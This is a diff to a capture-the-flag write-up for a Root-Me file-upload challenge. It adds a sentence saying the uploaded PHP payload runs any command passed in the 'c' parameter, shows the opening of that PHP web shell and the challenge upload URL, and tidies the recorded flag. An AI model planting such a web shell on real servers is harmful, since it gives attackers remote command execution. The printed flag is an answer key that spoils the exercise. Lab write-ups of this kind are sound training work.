@@ -19,6 +19,8 @@ When I upload a file I see this in BurpSuite :
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224153.png)
 
+The payload will allow me to run the command that I want with ?c=id : 
+
 ```
 <?php
 if(isset($_GET['c'])) {
@@ -44,7 +46,7 @@ http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/2ec40fea5de474a29
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307235605.png)
 
-Flag : Flag : YPNchi2NmTwygr2dgCCF
+Flag : YPNchi2NmTwygr2dgCCF
 
 ## WRONG CODE : 
 
